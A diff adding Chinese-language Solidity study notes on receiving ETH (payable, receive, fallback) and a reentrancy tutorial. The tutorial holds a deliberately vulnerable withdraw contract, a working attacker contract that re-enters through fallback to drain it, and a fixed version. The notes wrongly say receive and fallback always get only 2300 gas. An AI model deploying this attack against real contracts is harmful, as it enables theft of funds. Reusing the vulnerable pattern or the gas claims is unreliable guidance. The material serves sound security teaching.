@@ -2687,4 +2687,233 @@ contract Example {
         	}
         }
         ```
+### 2024.10.15
+#### 接收 ETH
+在 Solidity 中，接收 ETH 有幾種常見的方式，主要涉及到使用 `payable` 修飾符和適當的回退函數設計。以下是一些接收 ETH 的常見方式及注意事項：
+
+### 1. `payable` 修飾符
+
+- 要讓合約接收 ETH，必須將函數聲明為 `payable`
+- 常見的做法，是在建構函數或特定的函數中接收 ETH
+
+```solidity
+pragma solidity ^0.8.0;
+
+contract Example {
+	// 接收ETH的函數需要用payable修飾
+	function deposit() public payable {
+	// ETH 自動添加到合約的餘額中
+	}
+
+	// 查詢合約的餘額
+	function getBalance() public view returns (uint) {
+	    return address(this).balance;
+	}
+}
+```
+
+### 2. `receive` 函數
+
+- Solidity 0.6.0 之後
+- **觸發條件**：當外部帳戶向合約發送 ETH，且沒有附帶任何 calldata（即沒有指定函數或數據），`receive` 函數就會被觸發。
+- **語法要求**：`receive` 函數必須標記為 `external` 和 `payable`。
+- **Gas 限制**：默認情況下，`receive` 函數會有 2300 gas 限制（同樣的限制存在於 `fallback` 函數中），因此不能進行太複雜的操作。
+
+```solidity
+pragma solidity ^0.8.0;
+
+contract Example {
+	// 接收ETH的fallback或receive函數
+	receive() external payable {
+	// 可以在這裡添加邏輯，例如記錄發送者和金額
+	}
+	
+	// 查詢合約的餘額
+	function getBalance() public view returns (uint) {
+	    return address(this).balance;
+	}
+}
+
+```
+
+### 3. `fallback` 函數
+
+- **主要用途**：`fallback` 函數是作為一種「後備」機制，當合約調用的函數不存在時會被觸發，並且也可以用來接收 ETH。
+- **觸發條件**：
+    - 當對合約進行的調用（包括 ETH 轉帳）無法匹配合約中的任何函數簽名（即調用了不存在的函數）。
+    - 或者，當向合約發送 ETH，但合約中沒有定義 `receive` 函數時。
+- **語法要求**：`fallback` 函數可以是 `payable` 或非 `payable`，取決於是否希望它接收 ETH。
+    - `fallback` 函數如果標記為 `payable`，那麼它不僅會在函數匹配失敗時觸發，還會允許接收 ETH。
+    - 如果不標記 `payable`，則只會在函數匹配失敗時觸發，且不能接收 ETH。
+- **功能更廣泛**：除了接收 ETH 外，`fallback` 函數還可以用來處理合約接收到的未知函數調用。
+
+```solidity
+pragma solidity ^0.8.0;
+
+contract Example {
+	fallback() external payable {
+	// 這裡可以寫入簡單的處理邏輯
+	}
+	
+	function getBalance() public view returns (uint) {
+    return address(this).balance;
+	}
+}
+```
+
+### 兩者的差異總結
+
+| 特性 | `receive` 函數 | `fallback` 函數 |
+| --- | --- | --- |
+| **用途** | 專門用來接收 ETH，沒有附加數據時觸發 | 處理不存在的函數調用，且可以用來接收 ETH |
+| **觸發條件** | 當收到 ETH 並且沒有 calldata | 函數匹配失敗或轉帳時無 `receive` 函數 |
+| **是否接收 ETH** | 必須 `payable` 並接收 ETH | 可以是 `payable` 或非 `payable` |
+| **語法要求** | 必須是 `external` 和 `payable` | 可選 `payable`，也可以不接收 ETH |
+| **使用情境** | 僅處理 ETH 轉帳 | 兼具處理函數調用錯誤和 ETH 轉帳 |
+
+### 4. 注意事項
+
+- **Gas 限制**：`receive` 和 `fallback` 函數的 gas 非常有限（2300 gas），因此不能在這些函數中進行複雜的操作（例如寫入存儲）。
+- **安全性**：在接收 ETH 的合約中，務必考慮重入攻擊的可能性。合約在接收資金時可能被惡意合約利用，尤其是當合約依賴外部調用時。使用「檢查-效應-互動」模式來避免此類攻擊。
+- **處理失敗的 ETH 轉帳**：當將 ETH 發送回外部地址時，確保處理失敗的轉帳。建議使用 `call` 而非 `transfer` 或 `send`，因為它允許處理轉帳失敗的情況。
+
+```solidity
+(bool success, ) = recipient.call{value: amount}("");
+require(success, "Transfer failed.");
+```
+
+- **接收 ETH 的限額**：可以根據合約邏輯設置接收 ETH 的限額。例如，限制每次交易的最大 ETH 數額，以避免惡意發送超額資金。
+- **合約餘額管理**：合約接收到 ETH 後，應該有機制允許提取或重新分配。例如，合約擁有者或其他授權用戶可以提取合約中的 ETH。
+
+### 5. 為何駭客多會利用fallback，可否舉例
+
+`fallback` 函數常用於 **重入攻擊!!!**
+
+### **重入攻擊**（Reentrancy Attack）
+
+- 當合約在執行外部轉帳時，惡意合約通過 `fallback` 函數反覆調用原合約，從而進行多次提取資金的攻擊。
+- 過程的核心：合約在完成內部狀態更新前，先進行資金轉移，使惡意合約利用未更新的狀態來反覆提取資金。
+
+### 典型攻擊流程：
+
+1. 合約 A 向外部地址（可能是合約 B）進行資金轉移，並使用 `call` 來調用。
+2. 惡意合約 B 接收到 ETH 後，`fallback` 函數被觸發，並在 `fallback` 函數中重新調用合約 A 的提取資金函數。
+3. 合約 A 尚未更新內部狀態（例如尚未記錄該筆交易已完成），所以允許重複提取資金。
+4. 重複執行，直到合約 A 的資金被耗盡。
+- 重入攻擊的範例：
+    
+    ### 1. 有問題的合約
+    
+    ```solidity
+    pragma solidity ^0.8.0;
+    
+    contract VulnerableContract {
+        mapping(address => uint) public balances;
+    
+        // 使用者存款
+        function deposit() public payable {
+            balances[msg.sender] += msg.value;
+        }
+    
+        // 提取資金函數，存在重入漏洞
+        function withdraw() public {
+            uint amount = balances[msg.sender];
+    
+            // 調用外部地址，發送 ETH（此處的 call 是一個潛在漏洞）
+            (bool success, ) = msg.sender.call{value: amount}("");
+            require(success, "Transfer failed");
+    
+            // 更新餘額（此行在資金轉移之後，導致漏洞）
+            balances[msg.sender] = 0;
+        }
+    
+        // 查詢合約餘額
+        function getBalance() public view returns (uint) {
+            return address(this).balance;
+        }
+    }
+    ```
+    
+    ### **2. 惡意合約的 `fallback` 函數**
+    
+    - 惡意合約利用 `fallback` 函數來進行攻擊。
+    - 在這個例子中，惡意合約在 `fallback` 函數中重複調用原合約的 `withdraw` 函數。
+    
+    ```solidity
+    pragma solidity ^0.8.0;
+    
+    contract MaliciousContract {
+        VulnerableContract public vulnerable;
+    
+        constructor(address _vulnerableAddress) {
+            vulnerable = VulnerableContract(_vulnerableAddress);
+        }
+    
+        // 初次觸發提取資金的函數
+        function attack() public payable {
+            require(msg.value >= 1 ether, "Need at least 1 ETH");
+            vulnerable.deposit{value: 1 ether}();
+            vulnerable.withdraw();
+        }
+    
+        // fallback 函數，當接收到 ETH 時自動重入
+        fallback() external payable {
+            if (address(vulnerable).balance > 1 ether) {
+                vulnerable.withdraw();
+            }
+        }
+    
+        // 查詢合約餘額
+        function getBalance() public view returns (uint) {
+            return address(this).balance;
+        }
+    }
+    ```
+    
+    ### 攻擊步驟：
+    
+    1. 惡意合約向 `VulnerableContract` 存入 1 ETH 並調用 `withdraw()` 。
+    2. `withdraw()` 將向惡意合約發送 ETH，這會觸發惡意合約的 `fallback()` 函數。
+    3. 在 `fallback()` 函數中，惡意合約再次調用 `withdraw()`，由於 `VulnerableContract` 還沒有更新內部的 `balances` 狀態，這使得惡意合約可以多次提取資金。
+    4. 重複此過程，直到 `VulnerableContract` 的資金耗盡。
+    
+    ### 3. **如何防範重入攻擊**
+    
+    - 為了防止這類攻擊，Solidity 提供了一些良好的編碼慣例
+    - 最關鍵的一點是遵循「**檢查-效應-互動**」（Check-Effects-Interactions）模式。
+    - 這個模式建議在進行外部交互（例如轉帳或調用外部合約）之前，先更新合約的內部狀態，確保狀態已正確更新，防止重入。
+    
+    修改後的安全版本：
+    
+    ```solidity
+    pragma solidity ^0.8.0;
+    
+    contract SecureContract {
+        mapping(address => uint) public balances;
+    
+        function deposit() public payable {
+            balances[msg.sender] += msg.value;
+        }
+    
+        function withdraw() public {
+            uint amount = balances[msg.sender];
+    
+            // 先更新狀態，再進行外部調用，防止重入攻擊
+            balances[msg.sender] = 0;
+    
+            (bool success, ) = msg.sender.call{value: amount}("");
+            require(success, "Transfer failed");
+        }
+    
+        function getBalance() public view returns (uint) {
+            return address(this).balance;
+        }
+    }
+    ```
+    
+    ### 防範重入攻擊的其他措施：
+    
+    - **使用 `ReentrancyGuard`**：這是一個常用的合約設計模式，它通過添加一個鎖來防止重入調用。
+    - **限制 `fallback` 函數的使用**：避免在 `fallback` 函數中執行複雜的邏輯，或者限制其調用頻率和操作範圍。
+    - **使用 `transfer` 或 `send` 而非 `call`**：`transfer` 和 `send` 會限制 gas，這樣即使惡意合約有 `fallback` 函數，它也無法完成複雜的邏輯。但在新版 Solidity 中，因為 `transfer` 和 `send` 的局限性，更多使用 `call`，因此需要更多防範措施。
 <!-- Content_END -->
